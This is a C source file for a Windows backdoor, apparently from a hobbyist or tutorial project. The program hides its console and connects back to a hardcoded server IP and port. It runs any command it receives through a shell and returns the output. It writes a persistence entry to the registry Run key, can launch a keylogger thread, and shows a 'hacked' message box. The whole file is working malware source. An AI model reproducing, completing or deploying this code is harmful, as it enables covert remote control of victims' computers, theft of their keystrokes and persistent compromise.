#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h> // socket programming
#include <windows.h> // windows library
#include <winuser.h> // windows users
#include <wininet.h> // network library
#include <windowsx.h>
#include <string.h> // string manipulation
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h" // including library

// memset equivalent for linux bzero
#define bzero(p, size) (void) memset((p), 0, (size))

// global socket
int sock;

// win registries
int bootRun() {
  char err[128] = "Failed\n";
  char suc[128] = "Created Persistence At: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
  TCHAR szPath[MAX_PATH]; // max path limitation for Win10 = 256
  DWORD pathLen = 0; // DWORD - Double Word - unsigned 32bit integer
  pathLen = GetModuleFileName(NULL, szPath, MAX_PATH); // full path
  if(pathLen == 0) {
    send(sock, err, sizeof(err), 0);
    return -1;
  }
  // create registry
  HKEY NewVal; // handle to an open Registry key
  if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
    send(sock, err, sizeof(err), 0);
    return -1;
  }

  DWORD pathLenInBytes = pathLen * sizeof(*szPath);
  if(RegSetValueEx(NewVal,TEXT("HACKED"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
    RegCloseKey(NewVal);
    send(sock, err, sizeof(err), 0);
    return -1;
  }
  RegCloseKey(NewVal);
  send(sock, suc, sizeof(suc), 0);
  return 0;
}

// cut for change directory commands
char *
str_cut(char str[], int slice_from, int slice_to) {
  if(str[0] == '\0') {
    return NULL;
  }
  char *buffer;
  size_t str_len, buffer_len;

  if(slice_to < 0 && slice_from > slice_to) {
    str_len = strlen(str);
    // evaluating slices
    if(abs(slice_to) > str_len - 1) {
      return NULL;
    }

    // evaluating slices
    if(abs(slice_from) > str_len) {
      slice_from = (-1) * str_len;
    }

    buffer_len = slice_to - slice_from;
    str += (str_len + slice_from);

  } else if(slice_from >= 0 && slice_to > slice_from) {
    str_len = strlen(str);
    if(slice_from > str_len - 1) {
      return NULL;
    }
    buffer_len = slice_to - slice_from;
    str += slice_from;
  } else {
    return NULL;
  }

  buffer = calloc(buffer_len, sizeof(char));
  strncpy(buffer, str, buffer_len);
  return buffer;
}

// shell
void shell() {
  char buffer[1024]; // commands received
  char container[1024];
  char response[18384];
  // infinite loop
  while(1) {
    jump:
    // allocating zeros
    bzero(buffer, 1024);
    bzero(container, sizeof(container));
    bzero(response, sizeof(response));
    // receiving functions - storing in buffer
    recv(sock, buffer, 1024, 0);

    // commands comparison
    if(strncmp("q", buffer, 1) == 0) {
      // closing socket and program
      closesocket(sock);
      WSACleanup();
      exit(0);
    } else if(strncmp("cd ", buffer, 3) == 0) {
      // change directory
      chdir(str_cut(buffer, 3, 100));
    } else if(strncmp("persist", buffer, 7) == 0) {
      bootRun();
    } else if(strncmp("keylog_start", buffer, 12) == 0) {
      // thread - process independently in the background
      HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
      goto jump;
    } else {
      // file descriptors
      FILE *fp;
      // run as process - run buffer
      fp = _popen(buffer, "r");
      // response can fit into 1024 bytes - place in container
      while(fgets(container, 1024, fp) != NULL) {
        strcat(response, container); // adding the container content into total
      }
      // send total to the server
      send(sock, response, sizeof(response), 0);
      fclose(fp);
    }

  }
}

// windows entrypoint
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
  HWND stealth; // make it invisible
  AllocConsole(); // new console
  stealth = FindWindowA("ConsoleWindowClass", NULL); // handle to the top level Window
  ShowWindow(stealth, 0); // 0 is the nCmdShow

  struct sockaddr_in address; // Server Address
  unsigned short port; // port
  char *ip; // pointer to the server IP
  WSADATA wsaData; // windows socket object

  // IP for backdoor
  ip = "192.168.2.126";
  port = 6969;

  // check for sock initialization
  if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
    exit(1);
  }

  // defining socket object TCP
  sock = socket(AF_INET, SOCK_STREAM, 0);
  // defining sock params
  memset(&address, 0, sizeof(address)); // filling with zeros (memory, params and length)
  address.sin_family = AF_INET; // ipv4
  address.sin_addr.s_addr = inet_addr(ip); // IP address
  address.sin_port = htons(port); // port

  start:
  // perform the socket connection until the client is connected
  while (connect(sock, (struct sockaddr *) &address, sizeof(address)) != 0) {
    Sleep(10);
    goto start; // goto - start function
  }
  // dialog for notifying hack
  MessageBox(NULL, TEXT("Your device has been hacked"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
  shell(); // receive commands from the server , execute it and send the result
}
